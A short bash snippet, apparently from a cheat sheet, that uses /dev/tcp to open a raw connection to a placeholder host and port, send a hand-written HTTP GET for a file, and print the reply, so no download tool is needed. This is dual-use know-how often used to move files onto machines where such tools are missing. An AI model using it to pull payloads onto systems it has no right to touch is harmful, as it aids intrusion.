exec 3<>/dev/tcp/<IP>/<PORT>
echo -e "GET /<FILENAME> HTTP/1.1\n\n">&3
cat <&3 #print response
